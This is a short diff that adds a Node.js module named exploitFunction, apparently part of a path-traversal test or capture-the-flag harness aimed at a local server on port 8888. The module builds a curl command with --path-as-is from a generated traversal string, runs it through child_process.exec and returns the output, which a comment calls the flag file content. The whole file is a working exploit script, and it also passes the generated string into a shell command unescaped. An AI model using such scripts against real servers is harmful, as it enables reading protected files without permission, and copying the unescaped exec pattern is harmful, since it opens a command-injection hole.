@@ -1,0 +1,20 @@
+const path = require("path");
+
+function exploitFunction(payload) {
+  const { genstr } = payload;
+  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`;
+
+  // Simulate the execution of the attack string
+  const exec = require("child_process").exec;
+  exec(attack_string, (error, stdout) => {
+    if (error) {
+      console.error(`Error executing command: ${error}`);
+      return;
+    }
+    console.log(`Output: ${stdout}`);
+    // For demonstration purposes, we'll assume the output is the flag file content
+    return stdout; // Return the output for verification
+  });
+}
+
+module.exports = { exploitFunction };
